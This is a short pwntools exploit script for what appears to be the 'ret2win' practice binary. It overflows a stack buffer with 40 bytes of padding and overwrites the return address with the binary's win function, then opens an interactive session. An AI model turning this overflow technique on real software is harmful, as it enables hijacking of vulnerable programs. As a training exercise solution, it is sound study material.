from pwn import *

e = ELF("ret2win")
ret2winaddr = e.symbols["ret2win"]


eip = p64(ret2winaddr) # we are dealing with a 64bit address, thus we take the p64 rather than the p32 method
crap = "A"* 40

io = process("./ret2win")

io.sendline(crap + eip)

io.interactive()
